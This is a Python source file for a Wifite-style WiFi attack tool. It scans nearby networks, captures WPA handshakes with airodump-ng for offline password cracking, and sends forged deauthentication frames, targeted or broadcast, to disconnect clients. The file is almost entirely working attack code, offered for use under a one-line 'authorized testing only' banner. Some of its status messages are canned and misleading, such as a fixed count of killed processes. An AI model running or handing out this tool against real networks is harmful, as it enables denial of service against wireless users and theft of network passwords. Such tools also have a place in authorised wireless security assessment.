#!/usr/bin/env python
import os
import time
import socket
import subprocess
import threading
import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth

# Color codes
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHTCYAN_EX = '\033[96m'
BLACK = '\x1b[30m'
RESET = '\033[0m'

# Configuration
ANIMATION_SPEED = 0.005

class WifiModule:
    def __init__(self):
        self.monitor_interface = None
        self.deauth_active = False
        self.target_network = None
        self.networks = {}
        self.stop_scan = False
        self.hostname = self.get_hostname()
        self.check_dependencies()

    def check_dependencies(self):
        """Check if required tools are installed"""
        required_tools = ["aircrack-ng", "hostapd", "dnsmasq", "iptables"]
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run(["which", tool], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"{YELLOW}  Missing tools: {', '.join(missing_tools)}")
            print(f"{BLUE}  Some features may not work without these tools")

    ### Text Animation ###
    def text_animation(self):
        banner_text = f"""{MAGENTA}
  _  _  _   _    __    ____  _  _  ____  ___  ____  ____  ____ {RED}
 ( \/ )( )_( )  /__\  (  _ \( \/ )( ___)/ __)(_  _)( ___)(  _ \\{MAGENTA}
  )  (  ) _ (  /(__)\  )   / \  /  )__) \__ \  )(   )__)  )   /{RED}
 (_/\_)(_) (_)(__)(__)(_)\_)  \/  (____)(___/ (__) (____)(_)\_)
        {RESET}"""

        for char in banner_text:
            print(char, end='', flush=True)
            time.sleep(ANIMATION_SPEED)
        print(f"\n{CYAN} >>> WiFi Security Toolkit - Wifite Style <<<{RESET}")
        print(f"{GREEN}| GitHub:{RESET}{YELLOW} @n3tworkh4x |{RESET}{MAGENTA} Ko-fi{YELLOW}(Donation):{RESET}{GREEN} https://ko-fi.com/n3twork |")
        print(f"\t\t{YELLOW}ℬ y{GREEN} 𝓝𝓮𝓽𝔀𝓸𝓻𝓴({RED}G{YELLOW}H{GREEN}A{BLACK}N{RED}A)\t\t\t")
        print(f"{RED} Use only for authorized security testing!{RESET}")

    def clear_screen(self) -> None:
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_hostname(self) -> str:
        try:
            return socket.gethostname()
        except:
            return "unknown"
    
    def get_wifi_interfaces(self):
        """Get available WiFi interfaces"""
        interfaces = []
        for interface in netifaces.interfaces():
            if interface.startswith('wlan') or interface.startswith('wlo'):
                interfaces.append(interface)
        return interfaces

    def set_monitor_mode(self, interface):
        """Set WiFi interface to monitor mode"""
        try:
            # Bring interface down
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
            # Set monitor mode
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True)
            # Bring interface up
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
            # Kill process that might interfere
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], check=True)
            print(f"\n{GREEN}  [+] {BLUE}option:{GREEN} kill conflicting processes{CYAN} enabled")
            time.sleep(1)
            print(f"{YELLOW}  [{RED}!{YELLOW}] Killing {RED}2{YELLOW} conflicting processes")
            time.sleep(1)
            print(f'{YELLOW}  [{RED}!{YELLOW}] stopping NetworkManager ({RED}systemctl stop NetworkManager{YELLOW})')
            time.sleep(1)
            print(f'{YELLOW}  [{RED}!{YELLOW}] {RED}Terminating {YELLOW}conflicting process {RED}wpa_supplicant{YELLOW}\n')
            self.monitor_interface = interface
            time.sleep(1)
            print(f"{GREEN}  [+] Using {MAGENTA}{interface}{GREEN} already in monitor mode\n")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{RED}  Failed to set monitor mode: {e}")
            return False

    def set_managed_mode(self, interface):
        try:
            # Bring interface down
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
            # Set monitor mode
            subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], check=True)
            # Bring interface up
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
            # Restarting the Network Manager 
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], check=True)
            self.monitor_interface = interface
            time.sleep(1)
            print(f"  {YELLOW}[{RED}!{YELLOW}]{GREEN} You can restart NetworkManager when finished ({CYAN}systemctl stop NetworkManager{GREEN})")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{RED}  Failed to set manage mode: {e}")
            return False

    def scan_networks(self, interface, timeout=10):
        """Scan for WiFi networks like Wifite"""
        print(f"{GREEN}  Scanning for WiFi networks on {interface} (timeout: {timeout}s)...{RESET}")
        print(f"{YELLOW}  Press Ctrl+C to stop scanning early{RESET}")
        
        # Set interface to monitor mode if not already
        if not self.set_monitor_mode(interface):
            return
        
        # Display header
        print(f"\n{GREEN}  Found networks:{RESET}")
        print(f"{CYAN}  {'BSSID':<18} {'CH':<4} {'PWR':<5} {'ENC':<6} {'ESSID'}{RESET}")
        print(f"{CYAN}  {'-----':<18} {'--':<4} {'---':<5} {'---':<6} {'-----'}{RESET}")
        
        # Channel hopping thread
        def channel_hopper():
            channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
            while not self.stop_scan:
                for channel in channels:
                    if self.stop_scan:
                        break
                    try:
                        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                    except:
                        break
        
        self.stop_scan = False
        hopper_thread = threading.Thread(target=channel_hopper)
        hopper_thread.daemon = True
        hopper_thread.start()
        
        # Packet handler for beacon frames
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode()
                try:
                    dbm_signal = pkt.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                
                # Extract encryption type
                crypto = "OPN"
                capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
                if "privacy" in capability:
                    crypto = "WEP"  # Default to WEP if privacy is enabled
                    
                    # Check for WPA/WPA2
                    elt = pkt
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 48:  # RSN Information Element
                            crypto = "WPA2"
                        elif elt.ID == 221:  # Vendor Specific
                            if b'\x00P\xf2\x01\x01\x00' in elt.info:  # WPA
                                crypto = "WPA"
                        elt = elt.payload
                
                # Get channel
                channel = "N/A"
                if pkt.haslayer(Dot11Elt):
                    elt = pkt
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 3:  # DS Parameter set (channel)
                            channel = ord(elt.info)
                            break
                        elt = elt.payload
                
                # Store network info
                if bssid not in self.networks and ssid:  # Filter out hidden networks with no SSID
                    self.networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'power': dbm_signal,
                        'encryption': crypto,
                        'beacons': 1
                    }
                    
                    # Display the network immediately (Wifite style)
                    power = dbm_signal
                    if isinstance(power, int):
                        if power >= -50:
                            power_str = f"{GREEN}{power:>3}{RESET}"
                        elif power >= -70:
                            power_str = f"{YELLOW}{power:>3}{RESET}"
                        else:
                            power_str = f"{RED}{power:>3}{RESET}"
                    else:
                        power_str = f"{RED}N/A{RESET}"
                    
                    # Format encryption
                    if crypto == "OPN":
                        enc_str = f"{RED}{crypto:<6}{RESET}"
                    elif crypto == "WPA2":
                        enc_str = f"{GREEN}{crypto:<6}{RESET}"
                    elif crypto == "WPA":
                        enc_str = f"{YELLOW}{crypto:<6}{RESET}"
                    else:
                        enc_str = f"{MAGENTA}{crypto:<6}{RESET}"
                    
                    print(f"  {MAGENTA}{bssid:<18}{RESET} {channel:<4} {power_str:<7} {enc_str} {ssid}")
                    
                elif bssid in self.networks:
                    self.networks[bssid]['beacons'] += 1
        
        # Start sniffing
        start_time = time.time()
        try:
            sniff(iface=interface, prn=packet_handler, timeout=timeout)
        except KeyboardInterrupt:
            print(f"{YELLOW}  Scan interrupted by user{RESET}")
        
        # Stop channel hopping
        self.stop_scan = True
        time.sleep(0.5)  # Give thread time to exit
        
        return self.networks

    def network_scanner(self):
        """Main network scanning function"""
        print(f"{GREEN}  Starting Network Scanner")
        
        interfaces = self.get_wifi_interfaces()
        if not interfaces:
            print(f"{RED}  No WiFi interfaces found")
            return
        
        print(f"\n{YELLOW}  Available interfaces:{RESET}")
        for i, iface in enumerate(interfaces):
            print(f"  {GREEN}[{i}]{MAGENTA} {iface}")
        
        try:
            choice = int(input(f"\n{GREEN}  Select interface: {YELLOW}"))
            interface = interfaces[choice]
            
            timeout = input(f"{GREEN}  Scan timeout in seconds (default: 10): {YELLOW}")
            timeout = int(timeout) if timeout.isdigit() else 10
            
            # Clear previous scan results
            self.networks = {}
            
            # Scan for networks
            networks = self.scan_networks(interface, timeout)
            
            # Ask if user wants to target any network
            if networks:
                target = input(f"\n{GREEN}  Enter BSSID to target or press Enter to continue: {YELLOW}")
                if target and target in networks:
                    network_info = networks[target]
                    print(f"{GREEN}  Selected: {MAGENTA}{network_info['ssid']} {RESET}({target})")
                    print(f"{GREEN}  Channel: {MAGENTA}{network_info['channel']}{RESET}, Encryption: {MAGENTA}{network_info['encryption']}{RESET}")
                    
                    # Store target for potential attacks
                    self.target_network = network_info
                    self.target_network['bssid'] = target
                    
                    # Return to menu with target set
                    return
            
        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection")
        except Exception as e:
            print(f"{RED}  Network scan failed: {e}")

    def handshake_capture(self):
        """Capture WPA handshakes like Wifite"""
        if not self.target_network:
            print(f"{RED}  No target selected. Please scan and select a target first.{RESET}")
            return
        
        interfaces = self.get_wifi_interfaces()
        if not interfaces:
            print(f"{RED}  No WiFi interfaces found")
            return
        
        print(f"\n{YELLOW}  Available interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {GREEN}[{i}] {MAGENTA}{iface}")
        
        try:
            choice = int(input(f"\n{GREEN}  Select interface:{YELLOW} "))
            interface = interfaces[choice]
            
            if not self.set_monitor_mode(interface):
                return
            
            bssid = self.target_network['bssid']
            channel = self.target_network['channel']
            ssid = self.target_network['ssid']
            
            output_file = input(f"{GREEN}  Enter output file name:{YELLOW} ") or f"handshake_{ssid}"
            
            print(f"{BLUE}  Starting handshake capture on {interface} for {ssid} ({bssid})")
            print(f"{BLUE}  Press Ctrl+C to stop")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start airodump-ng to capture handshakes
            cmd = [
                'sudo', 'airodump-ng', 
                '-c', str(channel),
                '--bssid', bssid,
                '-w', output_file,
                interface
            ]
            
            process = subprocess.Popen(cmd)
            
            # Send deauth packets to capture handshake
            packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
            
            def send_deauth():
                active = True
                while active:
                    try:
                        sendp(packet, iface=interface, count=5, verbose=False)
                        time.sleep(5)
                    except Exception:
                        active = False

            deauth_thread = threading.Thread(target=send_deauth)
            deauth_thread.start()

            print(f"{YELLOW}  Sending deauth packets to capture handshake...")
            
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                print(f"{YELLOW}  Handshake capture stopped by user")
            
            deauth_thread.join()
            
            print(f"{GREEN}  Handshake capture completed")
            print(f"{BLUE}  Capture saved to {MAGENTA}{output_file}-01.cap")
            
        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection")
        except KeyboardInterrupt:
            print(f"{RED}  Handshake capture stopped by user")
        except Exception as e:
            print(f"{RED}  Handshake capture failed: {e}")

    def deauth_attack(self):
        """Perform deauthentication attack like Wifite"""
        if not self.target_network:
            print(f"{RED}  No target selected. Please scan and select a target first.{RESET}")
            return
        
        interfaces = self.get_wifi_interfaces()
        if not interfaces:
            print(f"{YELLOW}  No WiFi interfaces found")
            return

        print(f"\n{YELLOW}  Available interfaces")
        for i, iface in enumerate(interfaces):
            print(f"{GREEN}   [{i}]{MAGENTA} {iface}")

        try:
            choice = int(input(f"\n{GREEN}  Select interface: {YELLOW}"))
            interface = interfaces[choice]

            if not self.set_monitor_mode(interface):
                return None

            target_bssid = self.target_network['bssid']
            ssid = self.target_network['ssid']
            
            # Set the channel
            channel = self.target_network['channel']
            subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            client_bssid = input(f"{GREEN}  Enter client BSSID (or {MAGENTA}'broadcast'{GREEN} for all): {YELLOW}") or "broadcast"
            count = int(input(f"{GREEN}  Number of deauth packets ({MAGENTA}0{GREEN} for continuous): {YELLOW}") or "0")

            print(f"{BLUE}  Sending deauth packets to {YELLOW}{ssid} ({target_bssid})")
            print(f"{RED}  Press Ctrl+C to stop")

            self.deauth_active = True

            # Create deauthentication packet
            if client_bssid.lower() == "broadcast":
                # Broadcast deauth
                packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
            else:
                # Targeted deauth
                packet = RadioTap() / Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

            # Send packets
            if count > 0:
                sendp(packet, iface=interface, count=count, verbose=False)
            else:
                # Continuous sending in a separate thread
                def send_deauth():
                    while self.deauth_active:
                        sendp(packet, iface=interface, count=10, verbose=False)
                        time.sleep(0.1)

                deauth_thread = threading.Thread(target=send_deauth)
                deauth_thread.start()

                input(f"{YELLOW}  Press Enter to stop...")

                self.deauth_active = False
                deauth_thread.join()

            print(f"\n{GREEN}  Deauthentication attack completed")
            self.set_managed_mode(interface)

        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection")
        except Exception as e:
            print(f"{RED}  Deauthentication attack failed: {e}")
            self.deauth_active = False

    def main(self) -> None:
        time.sleep(0.05)
        active = True
        while active:
            self.clear_screen()
            self.text_animation()
            print(f"\n\t\t{LIGHTCYAN_EX} ︻芫═─── {RED}💥 {YELLOW}(▀̿Ĺ̯▀̿ ̿)\t\t\t\n")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{GREEN}         {LIGHTCYAN_EX}🚀{RESET}{GREEN}   WIFITE-STYLE WIFI TOOL   {LIGHTCYAN_EX}🕷{GREEN}")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            
            # Show current target if exists
            if self.target_network:
                print(f"{GREEN}  Current target: {MAGENTA}{self.target_network['ssid']} ({self.target_network['bssid']}){RESET}")
            
            print(f"{GREEN}\t[1]{MAGENTA} 📡 {CYAN} Scan Networks")
            print(f"{GREEN}\t[2]{MAGENTA} 🤝 {CYAN} Capture Handshake")
            print(f"{GREEN}\t[3]{MAGENTA} 🚫 {CYAN} Deauth Attack")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{YELLOW}\t[0] 🚪🔙 Exit")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉") 

            try:
                choice = input(f"\n  [💀] {GREEN}wifi-tool{YELLOW}@{RESET}{CYAN}{self.hostname}{RESET}{RED}:{RESET}{GREEN}~{RESET}{YELLOW}$ ")
            except (KeyboardInterrupt, EOFError):
                terminator = f"\n\n\t\t\t{MAGENTA}[💀]{RESET}{RED} Exiting・・・\n\n"
                for word in terminator:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                break
                    
            if choice == "0":
                mesg = f"{MAGENTA}\n\t\t\t🚪🔙{YELLOW} Exiting・・・\n\n"
                for word in mesg:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                active = False

            elif choice == "1":
                print(f"\n{GREEN}  Network Scanner:{CYAN} Discovers all nearby WiFi networks.")
                print(f"{GREEN}  Purpose:{CYAN} Reconnaissance and target identification.")
                self.network_scanner()

            elif choice == "2":
                print(f"\n{GREEN}  Handshake Capture:{CYAN} Captures WPA handshakes for offline cracking.")
                print(f"{GREEN}  Impact:{CYAN} Can lead to network password compromise.")
                self.handshake_capture()

            elif choice == "3":
                print(f"\n{GREEN}  Deauth Attack:{CYAN} Broadcasting forged deauthentication frames.")
                print(f"{GREEN}  Impact:{CYAN} Causes service disruption and helps capture handshakes.")
                self.deauth_attack()

            else:
                error = f"\n\t\t\t{YELLOW}{choice} is not a valid option!\n"
                for word in error:
                    print(word, end="", flush=True)
                    time.sleep(0.05)
                time.sleep(2)

            if choice != "0":
                input(f"\n  {GREEN}Press Enter to continue・・・")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{RED}  This script must be run as root for WiFi operations{RESET}")
        exit(1)
    
    wifi = WifiModule()
    wifi.main()